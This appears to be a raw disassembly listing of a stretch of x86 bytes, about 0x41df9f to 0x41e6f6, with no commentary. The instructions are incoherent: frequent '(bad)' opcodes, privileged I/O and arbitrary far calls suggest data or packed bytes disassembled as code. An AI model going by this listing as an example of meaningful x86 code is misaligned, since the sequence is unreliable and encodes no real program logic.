  41df9f:	sbb    BYTE PTR [ebx],ch
  41dfa1:	std    
  41dfa2:	fld    DWORD PTR [edi+0x1c]
  41dfa5:	test   BYTE PTR [ecx-0x1e47b081],0x8e
  41dfac:	(bad)  
  41dfad:	frstor [ecx]
  41dfaf:	icebp  
  41dfb0:	mov    edx,0xf381ffa8
  41dfb5:	int3   
  41dfb6:	mov    bl,0xae
  41dfb8:	push   edi
  41dfb9:	or     al,0x80
  41dfbb:	test   dh,bl
  41dfbd:	(bad)  
  41dfbe:	sbb    ebp,ebp
  41dfc0:	rol    BYTE PTR [eax+0x78],1
  41dfc3:	arpl   WORD PTR [edi-0x42345ae3],bx
  41dfc9:	and    al,0x60
  41dfcb:	outs   dx,DWORD PTR ds:[esi]
  41dfcc:	lods   al,BYTE PTR ds:[esi]
  41dfcd:	pop    esp
  41dfce:	stos   DWORD PTR es:[edi],eax
  41dfcf:	mov    bl,BYTE PTR [esi-0x6f]
  41dfd2:	pop    edi
  41dfd3:	push   eax
  41dfd4:	call   0x2255:0x28a92a59
  41dfdb:	xchg   edx,eax
  41dfdc:	jle    0x41dfe6
  41dfde:	xchg   edi,ebx
  41dfe0:	and    al,0xa3
  41dfe2:	aam    0x4b
  41dfe4:	fbld   TBYTE PTR [ecx+0x9]
  41dfe7:	lods   eax,DWORD PTR ds:[si]
  41dfe9:	out    0x3a,eax
  41dfeb:	loopne 0x41df97
  41dfed:	sub    edx,ebx
  41dfef:	imul   ecx,ebx,0x5806e99d
  41dff5:	data16 jne 0x41dfdc
  41dff8:	or     al,0xac
  41dffa:	mov    bh,cl
  41dffc:	stos   BYTE PTR es:[edi],al
  41dffd:	sbb    BYTE PTR [eax+0x21fcbfce],dh
  41e003:	xor    BYTE PTR [ecx],dh
  41e005:	cmc    
  41e006:	sbb    esp,DWORD PTR [ebp-0x64]
  41e009:	sub    bl,BYTE PTR [esi]
  41e00b:	enter  0xe2a9,0x6d
  41e00f:	idiv   BYTE PTR [ebp-0x57]
  41e012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e013:	lds    edx,FWORD PTR [ecx-0x47]
  41e016:	adc    bl,BYTE PTR [esi-0x330d578]
  41e01c:	js     0x41e098
  41e01e:	ret    
  41e01f:	scas   eax,DWORD PTR es:[edi]
  41e020:	inc    ebp
  41e021:	aad    0x86
  41e023:	sub    al,0xea
  41e025:	mov    dh,0x79
  41e027:	pop    ds
  41e028:	ds xchg ebx,eax
  41e02a:	sub    al,BYTE PTR [edi-0x6750a856]
  41e030:	cmp    eax,0x57c61c7a
  41e035:	cmp    bh,BYTE PTR [ecx+eax*1]
  41e038:	in     al,0x3b
  41e03a:	adc    eax,0x79902e8c
  41e03f:	xchg   esi,eax
  41e040:	xchg   edi,eax
  41e041:	mov    al,ds:0x5035ad2b
  41e046:	xchg   DWORD PTR [edx],edi
  41e048:	xlat   BYTE PTR ds:[ebx]
  41e049:	xor    cl,bh
  41e04b:	mov    ch,0x1d
  41e04d:	pop    ebp
  41e04e:	call   0xa47d:0xe838e359
  41e055:	xchg   bh,bl
  41e057:	ins    BYTE PTR es:[edi],dx
  41e058:	aad    0x5f
  41e05a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e05b:	call   0x7fc0:0x1017a281
  41e062:	mov    eax,ds:0x74e07f5f
  41e067:	icebp  
  41e068:	(bad)  
  41e069:	test   BYTE PTR ds:0xfad325bc,al
  41e06f:	mov    ds:0xee33be18,eax
  41e074:	test   eax,0x612d7b99
  41e079:	lods   al,BYTE PTR ds:[esi]
  41e07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07b:	sbb    ebp,edi
  41e07d:	jne    0x41e05d
  41e07f:	cli    
  41e080:	xor    eax,0x75dd29c2
  41e085:	pop    esi
  41e086:	xchg   esi,eax
  41e087:	fcom   QWORD PTR [esi-0x42]
  41e08a:	dec    eax
  41e08b:	(bad)  
  41e08c:	xor    eax,0x19ec5f35
  41e091:	ins    BYTE PTR es:[edi],dx
  41e092:	and    BYTE PTR [edx-0x1],0x5c
  41e096:	jg     0x41e0bb
  41e098:	pop    ebx
  41e099:	mov    ebp,0xd9fd6187
  41e09e:	inc    ecx
  41e09f:	inc    ecx
  41e0a0:	push   eax
  41e0a1:	in     al,dx
  41e0a2:	sbb    BYTE PTR [edi-0x59ba3211],ch
  41e0a8:	icebp  
  41e0a9:	ret    0xd919
  41e0ac:	inc    esp
  41e0ad:	popa   
  41e0ae:	cs jecxz 0x41e0cf
  41e0b1:	xrelease mov BYTE PTR [ecx],ch
  41e0b4:	fwait
  41e0b5:	add    BYTE PTR [esp+eiz*8+0x1d888769],0x4c
  41e0bd:	adc    DWORD PTR [eax+0x55],ebp
  41e0c0:	inc    esi
  41e0c1:	add    DWORD PTR [esi+0x9f3db76],ebx
  41e0c7:	adc    edi,DWORD PTR [edx+eiz*8]
  41e0ca:	inc    eax
  41e0cb:	or     eax,0x4aca36a6
  41e0d0:	and    BYTE PTR [edx+0x67539013],bl
  41e0d6:	and    BYTE PTR [eax+eiz*4+0x36],ah
  41e0da:	xchg   ebx,eax
  41e0db:	(bad)  
  41e0dc:	div    BYTE PTR ds:0x8053a1bb
  41e0e2:	(bad)  
  41e0e3:	hlt    
  41e0e4:	xlat   BYTE PTR ds:[ebx]
  41e0e5:	ja     0x41e0a3
  41e0e7:	adc    DWORD PTR [ecx-0x3d897679],esp
  41e0ed:	test   DWORD PTR [esi+eax*8+0x4911d261],esp
  41e0f4:	data16 cmp al,0x29
  41e0f7:	jge    0x41e08e
  41e0f9:	lods   eax,DWORD PTR ds:[esi]
  41e0fa:	(bad)
  41e0fe:	mov    ch,0xdd
  41e100:	push   ebx
  41e101:	inc    ebx
  41e102:	aam    0xb5
  41e104:	cmc    
  41e105:	xchg   BYTE PTR [edx+0x4d],cl
  41e108:	push   edi
  41e109:	jne    0x41e157
  41e10b:	popa   
  41e10c:	mov    ebx,0x8dc5e711
  41e111:	retf   0x71a3
  41e114:	iret   
  41e115:	sti    
  41e116:	xor    eax,0x210cbf9e
  41e11b:	lahf   
  41e11c:	pop    es
  41e11d:	in     al,0x4f
  41e11f:	xchg   ebp,eax
  41e120:	sub    eax,DWORD PTR [ecx+0x1d]
  41e123:	shr    DWORD PTR [esi-0x5c],cl
  41e126:	into   
  41e127:	aas    
  41e128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e129:	cwde   
  41e12a:	jbe    0x41e0af
  41e12c:	push   cs
  41e12d:	mov    ds:0xe2855b2e,al
  41e132:	scas   eax,DWORD PTR es:[edi]
  41e133:	mov    ebp,0x51715218
  41e138:	mov    ebp,0xffb520d5
  41e13d:	jo     0x41e144
  41e13f:	sbb    BYTE PTR [eax-0x1189c29c],al
  41e145:	addr16 pop edi
  41e147:	cmp    cl,al
  41e149:	sbb    al,0x1e
  41e14b:	xchg   esp,eax
  41e14c:	lods   al,BYTE PTR ds:[esi]
  41e14d:	(bad)  
  41e14f:	(bad)  
  41e150:	iret   
  41e151:	cmp    esp,DWORD PTR [esi]
  41e153:	vpcmpgtw xmm5,xmm3,XMMWORD PTR [ecx+0x1c27ba35]
  41e15b:	std    
  41e15c:	sbb    BYTE PTR ds:0x2a1c6977,cl
  41e162:	inc    ecx
  41e163:	call   0x44a8:0x6c1aca83
  41e16a:	mov    esp,esi
  41e16c:	loop   0x41e157
  41e16e:	sti    
  41e16f:	pushf  
  41e170:	push   cs
  41e171:	fstp   TBYTE PTR [eax-0x30]
  41e174:	push   edi
  41e175:	fnstenv [edx]
  41e177:	xchg   ebp,eax
  41e178:	push   es
  41e179:	lds    ebx,FWORD PTR [edi+0x6e]
  41e17c:	lods   eax,DWORD PTR ds:[esi]
  41e17d:	jnp    0x41e102
  41e17f:	pusha  
  41e180:	dec    esi
  41e181:	stos   DWORD PTR es:[edi],eax
  41e182:	iret   
  41e183:	mov    edi,0xaa7e5c85
  41e188:	stos   DWORD PTR es:[edi],eax
  41e189:	xor    BYTE PTR [edx+0x201b74],ch
  41e18f:	mov    BYTE PTR ds:0xfd0b2de7,cl
  41e195:	ja     0x41e1e7
  41e197:	push   ebx
  41e198:	(bad)  
  41e19a:	mov    ds:0x5a1649c2,al
  41e19f:	xchg   edx,eax
  41e1a0:	hlt    
  41e1a1:	mov    bl,0x9
  41e1a3:	xchg   ebp,eax
  41e1a4:	add    eax,0x20d6152d
  41e1a9:	jp     0x41e146
  41e1ab:	fstp   DWORD PTR [eax]
  41e1ad:	retf   
  41e1ae:	and    eax,0x938311c6
  41e1b3:	xchg   BYTE PTR [eax+esi*4+0x48426a6a],al
  41e1ba:	repnz ficomp WORD PTR [esi+0x478e762a]
  41e1c1:	xor    DWORD PTR [esp+esi*4-0x4a24e88b],eax
  41e1c8:	ret    0x121f
  41e1cb:	icebp  
  41e1cc:	adc    bh,BYTE PTR [ebp+0xd]
  41e1cf:	lods   al,BYTE PTR ds:[esi]
  41e1d0:	jne    0x41e1ef
  41e1d2:	pop    dx
  41e1d4:	xor    eax,0xfe1e14c6
  41e1d9:	dec    ecx
  41e1da:	xor    eax,0xf07408b4
  41e1df:	mov    ch,0xa6
  41e1e1:	inc    esp
  41e1e2:	sub    eax,0xae2cff2e
  41e1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e8:	jmp    0x41e260
  41e1ea:	sbb    BYTE PTR [eax],dl
  41e1ec:	pop    esp
  41e1ed:	psllq  mm2,mm5
  41e1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1f1:	or     dh,al
  41e1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f4:	ret    0xa92c
  41e1f7:	dec    esi
  41e1f8:	jl     0x41e184
  41e1fa:	imul   esp,edx,0x60d91c12
  41e200:	ret    0x7655
  41e203:	pop    esp
  41e204:	mov    ah,0xbe
  41e206:	inc    esi
  41e207:	xor    BYTE PTR [ecx+edi*4],bl
  41e20a:	mov    dh,0xd8
  41e20c:	jg     0x41e20c
  41e20e:	jae    0x41e242
  41e210:	adc    BYTE PTR [ebp-0x1b],0xb7
  41e214:	lds    ebp,FWORD PTR [edx]
  41e216:	jb     0x41e1d4
  41e218:	(bad)  
  41e219:	pop    ebp
  41e21a:	in     eax,0x69
  41e21c:	iret   
  41e21d:	fidiv  WORD PTR [edi-0x34]
  41e220:	(bad)  
  41e221:	outs   dx,DWORD PTR ds:[esi]
  41e222:	xlat   BYTE PTR ds:[ebx]
  41e223:	lods   al,BYTE PTR ds:[esi]
  41e224:	cmp    ch,ah
  41e226:	adc    eax,0x2d4ae1a2
  41e22b:	push   esi
  41e22c:	inc    edx
  41e22d:	adc    DWORD PTR [eax-0x2a],0x67f5a06f
  41e234:	popa   
  41e235:	(bad)  
  41e236:	div    BYTE PTR [ecx+0x50]
  41e239:	fcom   QWORD PTR [ebp-0x32]
  41e23c:	xchg   ecx,eax
  41e23d:	lahf   
  41e23e:	and    esp,eax
  41e240:	aam    0x46
  41e242:	data16 test BYTE PTR [ebp+0x20],ch
  41e246:	mov    esi,edx
  41e248:	inc    ebp
  41e249:	lods   eax,DWORD PTR ds:[esi]
  41e24a:	lahf   
  41e24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e24c:	rol    DWORD PTR [ecx-0x6b066e5c],cl
  41e252:	call   0xe241790c
  41e257:	push   es
  41e258:	sbb    ebp,0x569fd139
  41e25e:	fnstcw WORD PTR [esi-0x3e]
  41e261:	jge    0x41e2bf
  41e263:	out    0x6b,al
  41e265:	dec    edx
  41e266:	mov    edi,0x3f88621f
  41e26b:	mov    bl,BYTE PTR [edi-0x15]
  41e26e:	xchg   dh,bl
  41e270:	inc    edx
  41e271:	lea    ebp,[ecx+eiz*1-0x5]
  41e275:	rol    DWORD PTR [ecx],0xe4
  41e278:	sti    
  41e279:	adc    al,0xbe
  41e27b:	push   ebx
  41e27c:	pop    ss
  41e27d:	ja     0x41e2b6
  41e27f:	call   0x56fb:0xff739863
  41e286:	xlat   BYTE PTR ds:[ebx]
  41e287:	push   ds
  41e288:	sub    BYTE PTR [ebx+0xab9d98a],ch
  41e28e:	dec    edx
  41e28f:	cmc    
  41e290:	les    edi,FWORD PTR [ebx+0x6]
  41e293:	jp     0x41e231
  41e295:	stos   BYTE PTR es:[edi],al
  41e296:	xor    dl,BYTE PTR [ecx+ebx*4+0x7f]
  41e29a:	mov    ds:0x861a79cc,al
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	and    al,BYTE PTR [edi-0x5c]
  41e2a3:	adc    bp,WORD PTR [edi+0x7a]
  41e2a7:	xchg   esi,eax
  41e2a8:	test   al,0x94
  41e2aa:	sub    BYTE PTR [esp+edx*2],bl
  41e2ad:	pop    ecx
  41e2ae:	add    eax,0x5bbf8927
  41e2b3:	nop
  41e2b4:	xor    ah,BYTE PTR cs:[ebx-0x246c72d2]
  41e2bb:	in     eax,0x75
  41e2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2be:	sti    
  41e2bf:	ret    
  41e2c0:	mov    ebp,0x71682467
  41e2c5:	adc    eax,0x73998a68
  41e2ca:	sbb    al,0xa4
  41e2cc:	add    al,0x4e
  41e2ce:	mov    bl,0x94
  41e2d0:	xor    esi,DWORD PTR [esi+eax*2]
  41e2d3:	sahf   
  41e2d4:	and    BYTE PTR [edi],bl
  41e2d6:	mov    ss,WORD PTR [edx+0xa3e1afe]
  41e2dc:	cmp    DWORD PTR [ebx+0x4a5ae32f],ebp
  41e2e2:	sbb    al,0xe5
  41e2e4:	or     eax,0xaed9569f
  41e2e9:	mov    al,0xf3
  41e2eb:	pushf  
  41e2ec:	cwde   
  41e2ed:	arpl   WORD PTR ds:0x6236c5db,di
  41e2f3:	in     al,dx
  41e2f4:	xchg   DWORD PTR [edi],ecx
  41e2f6:	retf   
  41e2f7:	retf   0xaef6
  41e2fa:	mov    ebx,0x3e6c97be
  41e2ff:	push   ebp
  41e300:	mov    ecx,0x7b27125e
  41e305:	dec    ebx
  41e306:	jge    0x41e307
  41e308:	cmp    DWORD PTR [esi],0xffffffe0
  41e30b:	ins    DWORD PTR es:[edi],dx
  41e30c:	cmp    ebp,DWORD PTR [eax+eiz*1+0x128e6a9e]
  41e313:	xor    DWORD PTR [edx+0x3e],esp
  41e316:	add    edx,ebp
  41e318:	in     eax,dx
  41e319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31a:	adc    BYTE PTR [esi-0x520f02c0],cl
  41e320:	xlat   BYTE PTR ds:[ebx]
  41e321:	push   ecx
  41e322:	xor    bh,ch
  41e324:	out    0x20,al
  41e326:	loope  0x41e312
  41e328:	fwait
  41e329:	mov    ds:0xd77b9b8a,al
  41e32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e32f:	and    eax,0x6b8de6f9
  41e334:	(bad)  
  41e335:	aam    0x8f
  41e337:	push   ecx
  41e338:	and    al,0x40
  41e33a:	push   ecx
  41e33b:	push   edx
  41e33c:	fld    DWORD PTR [eax+0x6689e6b8]
  41e342:	sbb    BYTE PTR [ecx],ch
  41e344:	ss (bad) 
  41e346:	push   eax
  41e347:	adc    al,0x18
  41e349:	popa   
  41e34a:	push   edi
  41e34b:	lods   eax,DWORD PTR ds:[esi]
  41e34c:	cmp    ch,bl
  41e34e:	jo     0x41e38f
  41e350:	in     eax,dx
  41e351:	adc    edx,DWORD PTR [eax+0x29]
  41e354:	test   ecx,edi
  41e356:	fisubr DWORD PTR [ebx+0x19a81c63]
  41e35c:	in     eax,dx
  41e35d:	mov    ds:0x4bbfab10,al
  41e362:	daa    
  41e363:	js     0x41e38d
  41e365:	adc    ah,BYTE PTR [edi-0x19931cdf]
  41e36b:	mov    ebx,0xb5619e10
  41e370:	mov    gs,WORD PTR [edx-0xe]
  41e373:	mov    eax,0x4e935b25
  41e378:	push   cs
  41e379:	xchg   BYTE PTR [ebx],bh
  41e37b:	push   edi
  41e37c:	ret    
  41e37d:	xchg   edi,eax
  41e37e:	js     0x41e3cb
  41e380:	dec    edi
  41e381:	stos   BYTE PTR es:[edi],al
  41e382:	jmp    0xbc611a54
  41e387:	aam    0x19
  41e389:	in     al,0xb4
  41e38b:	xlat   BYTE PTR ds:[ebx]
  41e38c:	push   ebp
  41e38d:	xor    eax,0x69240b5d
  41e392:	and    eax,0x4be2eab9
  41e397:	adc    ebx,DWORD PTR gs:[eax-0x243f60]
  41e39e:	loop   0x41e329
  41e3a0:	lahf   
  41e3a1:	lea    esp,[eax+0x4f]
  41e3a4:	sub    dl,BYTE PTR [eax-0x251953d0]
  41e3aa:	fwait
  41e3ab:	mov    BYTE PTR [ecx+ecx*4],dh
  41e3ae:	mov    ebx,0x301eb53c
  41e3b3:	adc    ebp,DWORD PTR [edi+ecx*1-0x67d3e103]
  41e3ba:	(bad)  
  41e3bb:	aad    0xdc
  41e3bd:	lds    edx,FWORD PTR ds:0x95f4d261
  41e3c3:	mov    eax,0x6646c064
  41e3c8:	push   es
  41e3c9:	shl    BYTE PTR [edi],cl
  41e3cb:	rcr    BYTE PTR [ecx+ebx*1+0x2b2e77a3],1
  41e3d2:	xchg   edi,eax
  41e3d3:	jmp    0x9da1f119
  41e3d8:	stc    
  41e3d9:	daa    
  41e3da:	push   edi
  41e3db:	and    al,ah
  41e3dd:	cmp    DWORD PTR [edx-0x1c],edi
  41e3e0:	push   ebp
  41e3e1:	push   ds
  41e3e2:	cmp    al,0xd7
  41e3e4:	test   DWORD PTR [edx+0x32],ebp
  41e3e7:	xchg   edi,eax
  41e3e8:	sub    BYTE PTR es:[edi+0x65aeed01],0x94
  41e3f0:	cli    
  41e3f1:	xchg   esp,eax
  41e3f2:	in     eax,0x45
  41e3f4:	mov    eax,esi
  41e3f6:	call   0x73e8fd1b
  41e3fb:	retf   
  41e3fc:	push   es
  41e3fd:	push   esi
  41e3fe:	sar    BYTE PTR [edx+0x5ca78691],cl
  41e404:	or     esi,DWORD PTR [edi]
  41e406:	ja     0x41e3b8
  41e408:	in     al,dx
  41e409:	ins    BYTE PTR es:[edi],dx
  41e40a:	mov    BYTE PTR [ecx-0x28],bl
  41e40d:	lods   eax,DWORD PTR ds:[esi]
  41e40e:	fadd   QWORD PTR [esi-0x6998693c]
  41e414:	leave  
  41e415:	add    al,ch
  41e417:	xor    eax,0xc966c705
  41e41c:	push   ecx
  41e41d:	outs   dx,BYTE PTR ds:[esi]
  41e41e:	sbb    esi,DWORD PTR ss:[ecx-0x2b]
  41e422:	cmp    eax,DWORD PTR [esi+0x76]
  41e425:	arpl   WORD PTR [ecx],di
  41e427:	ret    
  41e428:	cmp    BYTE PTR [edi],al
  41e42a:	or     eax,0x974e81b4
  41e42f:	sbb    DWORD PTR [ebp+0x5e],esi
  41e432:	ror    ah,0x22
  41e435:	sub    ch,bh
  41e437:	loop   0x41e428
  41e439:	add    al,0x84
  41e43b:	push   eax
  41e43c:	and    ch,BYTE PTR [ebp-0x51d0a033]
  41e442:	xchg   BYTE PTR [edi-0x1d],ah
  41e445:	js     0x41e3fa
  41e447:	scas   eax,DWORD PTR es:[edi]
  41e448:	xchg   DWORD PTR [ebx],ebp
  41e44a:	pop    ecx
  41e44b:	xchg   esp,eax
  41e44c:	pop    eax
  41e44d:	push   0x632d706
  41e452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e453:	push   ss
  41e454:	pop    eax
  41e455:	jecxz  0x41e402
  41e457:	shl    dl,1
  41e459:	icebp  
  41e45a:	lods   al,BYTE PTR ds:[esi]
  41e45b:	aad    0xc5
  41e45d:	ret    
  41e45e:	or     edi,ebx
  41e460:	add    al,0xa0
  41e462:	cmc    
  41e463:	cs mov cl,0x20
  41e466:	mov    esp,0xcf4825dc
  41e46b:	out    dx,al
  41e46c:	jae    0x41e439
  41e46e:	jo     0x41e3f7
  41e470:	push   0x2d
  41e472:	rcl    ebx,1
  41e474:	xchg   esp,eax
  41e475:	lds    ebp,FWORD PTR [ebx-0x38]
  41e478:	xor    al,0x95
  41e47a:	(bad)  [esi+0x74]
  41e47d:	mov    BYTE PTR [ecx-0x70],ch
  41e480:	pop    es
  41e481:	stos   DWORD PTR es:[edi],eax
  41e482:	scas   eax,DWORD PTR es:[edi]
  41e483:	test   al,0x16
  41e485:	loope  0x41e46f
  41e487:	and    al,0xe1
  41e489:	adc    al,0x9b
  41e48b:	ror    BYTE PTR [edx],1
  41e48d:	ins    DWORD PTR es:[edi],dx
  41e48e:	nop
  41e48f:	es icebp 
  41e491:	xor    BYTE PTR [edi],bh
  41e493:	adc    ebp,0x3a
  41e496:	mov    ebp,0x5a891b46
  41e49b:	test   DWORD PTR [edi],ecx
  41e49d:	mov    DWORD PTR [edx],esp
  41e49f:	jns    0x41e46a
  41e4a1:	shl    DWORD PTR [ecx+0x25],1
  41e4a4:	or     al,BYTE PTR ds:0xca28251e
  41e4aa:	xchg   esi,eax
  41e4ab:	out    dx,al
  41e4ac:	xchg   esi,eax
  41e4ad:	in     eax,0xbf
  41e4af:	mov    ebx,0x6f4082da
  41e4b4:	push   0x490be7ef
  41e4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4ba:	xchg   DWORD PTR ds:0x40ee4422,edi
  41e4c0:	xchg   ebp,eax
  41e4c1:	neg    BYTE PTR [eax-0x28]
  41e4c4:	addr16 jp 0x41e532
  41e4c7:	retf   
  41e4c8:	fs call 0xc12b:0x74d385ce
  41e4d0:	sbb    ebp,0xd5554c1
  41e4d6:	add    BYTE PTR [ecx-0xb79e0b3],ah
  41e4dc:	scas   al,BYTE PTR es:[edi]
  41e4dd:	sub    cl,0xe7
  41e4e0:	jmp    0x41e4e5
  41e4e2:	fidivr DWORD PTR [edi-0x624dcd56]
  41e4e8:	arpl   WORD PTR [eax+0x7ed47786],bx
  41e4ee:	ins    DWORD PTR es:[edi],dx
  41e4ef:	(bad)  
  41e4f0:	lods   eax,DWORD PTR ds:[esi]
  41e4f1:	or     eax,0x8b2ee77d
  41e4f6:	inc    ebx
  41e4f7:	xchg   esp,eax
  41e4f8:	mov    esi,0xb8254c78
  41e4fd:	mov    ch,0x55
  41e4ff:	shr    BYTE PTR [esi],0x80
  41e502:	inc    edi
  41e503:	int    0xd8
  41e505:	int    0x9e
  41e507:	in     al,dx
  41e508:	shl    BYTE PTR [esi+0x8],cl
  41e50b:	fsubr  DWORD PTR [esi+0xa]
  41e50e:	test   DWORD PTR ds:[edx+ebx*2+0x26],esi
  41e513:	dec    ecx
  41e514:	adc    al,0x86
  41e516:	or     eax,0x8b6609a1
  41e51b:	push   edi
  41e51c:	jp     0x41e4d0
  41e51e:	inc    ebx
  41e51f:	(bad)  
  41e520:	mov    bl,0x8b
  41e522:	mov    DWORD PTR [eax+esi*1+0x90fc292],ebx
  41e529:	or     BYTE PTR [edi+edx*4],bh
  41e52c:	outs   dx,DWORD PTR ds:[esi]
  41e52d:	mov    eax,0x7f2e3b99
  41e532:	add    cl,BYTE PTR [esi-0x38]
  41e535:	pusha  
  41e536:	aaa    
  41e537:	adc    esi,DWORD PTR [esi-0x6c]
  41e53a:	popa   
  41e53b:	mov    esp,0xd076d814
  41e540:	outs   dx,BYTE PTR ds:[esi]
  41e541:	dec    edi
  41e542:	or     eax,0x3c21469b
  41e547:	btc    DWORD PTR [eax+0x17],ecx
  41e54b:	sbb    BYTE PTR [edi+0x3b3eaf6e],bh
  41e551:	or     al,0x8
  41e553:	cmp    edx,esp
  41e555:	inc    edx
  41e556:	fcmovb st,st(6)
  41e558:	call   0x9192:0x41dc9414
  41e55f:	ret    0x6f33
  41e562:	sub    eax,0x67243dc8
  41e567:	in     al,0x48
  41e569:	lds    esp,FWORD PTR [esi]
  41e56b:	mov    esp,0x212c35b3
  41e570:	bound  esi,QWORD PTR [ecx+0x1e6fff4a]
  41e576:	test   eax,0xb7204bf5
  41e57b:	xchg   BYTE PTR [esi+0x27fbdad3],bh
  41e581:	cs push ds
  41e583:	sbb    edi,DWORD PTR [esi]
  41e585:	or     BYTE PTR [eax],dh
  41e587:	mov    cl,0x23
  41e589:	lock fwait
  41e58b:	cmc    
  41e58c:	and    edx,DWORD PTR [esi-0x8e3464b]
  41e592:	lock pop ecx
  41e594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e596:	mov    ds:0x44915a51,eax
  41e59b:	mov    ah,0xf8
  41e59d:	stc    
  41e59e:	enter  0x8870,0x66
  41e5a2:	mov    ebp,0xd8da30a8
  41e5a7:	out    dx,al
  41e5a8:	nop
  41e5a9:	pop    eax
  41e5aa:	rcl    ebp,cl
  41e5ac:	mov    ds:0xee717f12,al
  41e5b1:	adc    al,0x98
  41e5b3:	lea    esi,[ebx+0x66a425e4]
  41e5b9:	push   esp
  41e5ba:	mov    ds:0xfd7c863f,eax
  41e5bf:	in     eax,dx
  41e5c0:	mov    ch,0x54
  41e5c2:	repnz xchg edi,eax
  41e5c4:	nop
  41e5c5:	inc    ebx
  41e5c6:	sub    BYTE PTR ds:0x94cd02a2,bh
  41e5cc:	dec    edx
  41e5cd:	int    0xec
  41e5cf:	jne    0x41e62e
  41e5d1:	jns    0x41e5ca
  41e5d3:	je     0x41e5fc
  41e5d5:	fwait
  41e5d6:	jmp    0x3a381745
  41e5db:	jae    0x41e5f8
  41e5dd:	mov    ah,0xac
  41e5df:	dec    esp
  41e5e0:	aad    0xea
  41e5e2:	mov    edi,DWORD PTR [eax]
  41e5e4:	aam    0x8f
  41e5e6:	mov    ds:0xa033f63,al
  41e5eb:	or     WORD PTR fs:[edx+edx*8-0x2f],dx
  41e5f1:	jns    0x41e62e
  41e5f3:	loopne 0x41e643
  41e5f5:	loopne 0x41e60f
  41e5f7:	xchg   ecx,eax
  41e5f8:	ret    0x850b
  41e5fb:	jle    0x41e624
  41e5fd:	xchg   edx,eax
  41e5fe:	add    esp,DWORD PTR [ecx+0x78]
  41e601:	sub    al,0xe9
  41e603:	rol    BYTE PTR [edx+ebp*2+0x3e11e84b],cl
  41e60a:	mov    dl,0x94
  41e60c:	cmp    bh,BYTE PTR [esi-0x6]
  41e60f:	and    edi,esi
  41e611:	pop    es
  41e612:	sahf   
  41e613:	call   0xc87a:0x9e3100ad
  41e61a:	fcomp  DWORD PTR [edi+esi*2]
  41e61d:	scas   al,BYTE PTR es:[edi]
  41e61e:	jecxz  0x41e60c
  41e620:	fiadd  WORD PTR [eax+0x5649b920]
  41e626:	daa    
  41e627:	test   al,0x84
  41e629:	neg    BYTE PTR [eax]
  41e62b:	loope  0x41e5e8
  41e62d:	in     al,dx
  41e62e:	mov    DWORD PTR [edi+0x5d4e9fae],edx
  41e634:	mov    bl,BYTE PTR [ecx-0x448907eb]
  41e63a:	mov    eax,0x3787104e
  41e63f:	repnz stc 
  41e641:	mov    ds:0xb962762f,al
  41e646:	(bad)  
  41e647:	sbb    ch,BYTE PTR [edx+0x3d]
  41e64a:	out    0xf4,eax
  41e64c:	jns    0x41e67c
  41e64e:	xchg   BYTE PTR [edx-0x101cfd6],ch
  41e654:	out    0x52,eax
  41e656:	mov    bh,ah
  41e658:	mov    eax,ds:0xc5a8201e
  41e65d:	push   esp
  41e65e:	push   cs
  41e65f:	lahf   
  41e660:	xchg   edi,eax
  41e661:	sbb    bh,BYTE PTR [eax+0x6b]
  41e664:	sahf   
  41e665:	jp     0x41e5e9
  41e667:	out    0xd1,al
  41e669:	xchg   BYTE PTR [eax],bl
  41e66b:	imul   esp,DWORD PTR [edx],0x3d
  41e66e:	jne    0x41e6a7
  41e670:	or     al,0xb5
  41e672:	les    ebp,FWORD PTR ds:0x79bb3c9c
  41e678:	in     eax,dx
  41e679:	not    DWORD PTR [ebp+ebx*2-0x16]
  41e67d:	cmp    eax,0x1671e025
  41e682:	lea    eax,[ebx+0x4e67ff2f]
  41e688:	nop
  41e689:	je     0x41e674
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	xchg   DWORD PTR [edx+ecx*4-0x3c252006],edx
  41e694:	mov    esp,0x200c1aea
  41e699:	retf   0xb238
  41e69c:	outs   dx,BYTE PTR ds:[esi]
  41e69d:	js     0x41e6db
  41e69f:	adc    al,0x87
  41e6a1:	jl     0x41e707
  41e6a3:	or     eax,0x6b0412a9
  41e6a8:	lock (bad) 
  41e6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ab:	shl    DWORD PTR ds:0x431e4f89,1
  41e6b1:	mov    DWORD PTR es:[eax],ebp
  41e6b4:	pop    eax
  41e6b5:	adc    edx,DWORD PTR [ebx+ebp*1+0x761db26a]
  41e6bc:	push   0xecef6ca1
  41e6c1:	loop   0x41e736
  41e6c3:	call   edx
  41e6c5:	outs   dx,DWORD PTR ds:[esi]
  41e6c6:	mov    edi,0x146de269
  41e6cb:	sti    
  41e6cc:	mov    eax,ds:0xdc05e3fe
  41e6d1:	stos   BYTE PTR es:[edi],al
  41e6d2:	xor    eax,0x67439b19
  41e6d7:	adc    dh,bl
  41e6d9:	icebp  
  41e6da:	add    DWORD PTR [ebp-0xf],ebx
  41e6dd:	pop    esi
  41e6de:	dec    edx
  41e6df:	jl     0x41e75b
  41e6e1:	fcomi  st,st(4)
  41e6e3:	fs pop edx
  41e6e5:	scas   eax,DWORD PTR es:[edi]
  41e6e6:	(bad)  
  41e6e7:	mov    esi,esp
  41e6e9:	jns    0x41e715
  41e6eb:	mov    cl,0x48
  41e6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ee:	stos   DWORD PTR es:[edi],eax
  41e6ef:	out    0x54,al
  41e6f1:	and    BYTE PTR [ebp-0x10],dl
  41e6f4:	jno    0x41e71f
  41e6f6:	dec    esp
